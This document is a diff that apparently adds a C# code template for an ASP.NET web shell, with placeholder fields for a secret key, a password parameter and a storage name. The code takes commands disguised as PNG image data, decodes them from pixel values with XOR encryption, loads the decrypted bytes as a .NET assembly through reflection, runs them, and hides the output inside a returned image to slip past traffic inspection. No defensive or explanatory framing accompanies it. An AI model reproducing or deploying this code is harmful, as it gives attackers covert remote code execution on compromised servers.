@@ -1,0 +1,114 @@
+        System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
+        try
+        {
+            string key = "{secretKey}";
+            string ndata = {pass};
+            string dataPrefix = "data:image/png;base64,";
+            if (!ndata.StartsWith(dataPrefix))
+            {
+                throw new System.ArgumentException("Invalid image data format");
+            }
+            string base64Data = ndata.Substring(dataPrefix.Length);
+            byte[] encryptedData = System.Convert.FromBase64String(base64Data);
+            byte[] data = null;
+            byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(key);
+
+            using (System.IO.MemoryStream ms = new System.IO.MemoryStream(encryptedData))
+            {
+                System.Drawing.Bitmap image = new System.Drawing.Bitmap(ms);
+                int width = image.Width;
+                int height = image.Height;
+                byte[] encodedBytes = new byte[width * height * 3];
+                int index = 0;
+                for (int y = 0; y < height; y++)
+                {
+                    for (int x = 0; x < width; x++)
+                    {
+                        System.Drawing.Color color = image.GetPixel(x, y);
+                        encodedBytes[index++] = color.R;
+                        encodedBytes[index++] = color.G;
+                        encodedBytes[index++] = color.B;
+                    }
+                }
+                for (int i = 0; i < encodedBytes.Length; i++)
+                {
+                    encodedBytes[i] = (byte)(encodedBytes[i] ^ keyBytes[i % keyBytes.Length]);
+                }
+                int suffixIndex = encodedBytes.Length - 1;
+                while (suffixIndex >= 2 && !(encodedBytes[suffixIndex] == 0x00 &&
+                       encodedBytes[suffixIndex - 1] == 0x88 &&
+                       encodedBytes[suffixIndex - 2] == 0xff))
+                {
+                    suffixIndex--;
+                }
+
+                if (suffixIndex < 2)
+                {
+                    throw new System.ArgumentException("Invalid encoded bytes");
+                }
+                data = System.Linq.Enumerable.ToArray(System.Linq.Enumerable.Take(encodedBytes, suffixIndex - 2));
+            }
+            if (Context.Application["{payloadStoreName}"] == null)
+            {
+                Context.Application["{payloadStoreName}"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly)
+                    .GetMethod("Load", new System.Type[] { typeof(byte[]) })
+                    .Invoke(null, new object[] { data });
+            }
+            else
+            {
+                object o = ((System.Reflection.Assembly)Context.Application["{payloadStoreName}"]).CreateInstance("LY");
+                System.IO.MemoryStream outStream = new System.IO.MemoryStream();
+                o.Equals(outStream);
+                o.Equals(data);
+                o.ToString();
+                byte[] r = outStream.ToArray();
+
+                if (r != null && r.Length > 0)
+                {
+                    byte[] suffix = { 0xff, 0x88, 0x00 };
+                    byte[] encodedBytes = new byte[r.Length + suffix.Length];
+                    System.Array.Copy(r, encodedBytes, r.Length);
+                    System.Array.Copy(suffix, 0, encodedBytes, r.Length, suffix.Length);
+                    int remaining = encodedBytes.Length % 3;
+                    if (remaining != 0)
+                    {
+                        byte[] padding = new byte[3 - remaining];
+                        new System.Random().NextBytes(padding);
+                        System.Array.Resize(ref encodedBytes, encodedBytes.Length + padding.Length);
+                        System.Array.Copy(padding, 0, encodedBytes, encodedBytes.Length - padding.Length, padding.Length);
+                    }
+                    for (int i = 0; i < encodedBytes.Length; i++)
+                    {
+                        encodedBytes[i] = (byte)(encodedBytes[i] ^ keyBytes[i % keyBytes.Length]);
+                    }
+                    int width = (int)System.Math.Ceiling(System.Math.Sqrt(encodedBytes.Length / 3.0));
+                    int height = (int)System.Math.Ceiling((double)encodedBytes.Length / (width * 3));
+                    System.Drawing.Bitmap image = new System.Drawing.Bitmap(width, height);
+                    int index = 0;
+                    for (int y = 0; y < height; y++)
+                    {
+                        for (int x = 0; x < width; x++)
+                        {
+                            if (index < encodedBytes.Length)
+                            {
+                                int red = encodedBytes[index++] & 0xFF;
+                                int green = index < encodedBytes.Length ? encodedBytes[index++] & 0xFF : 0;
+                                int blue = index < encodedBytes.Length ? encodedBytes[index++] & 0xFF : 0;
+                                image.SetPixel(x, y, System.Drawing.Color.FromArgb(red, green, blue));
+                            }
+                        }
+                    }
+                    using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
+                    {
+                        image.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                        byte[] imageBytes = ms.ToArray();
+                        stringBuilder.Append("data:image/png;base64,");
+                        stringBuilder.Append(System.Convert.ToBase64String(imageBytes));
+                    }
+                }
+            }
+        }
+        catch (System.Exception)
+        {
+        }
+        return stringBuilder.ToString();
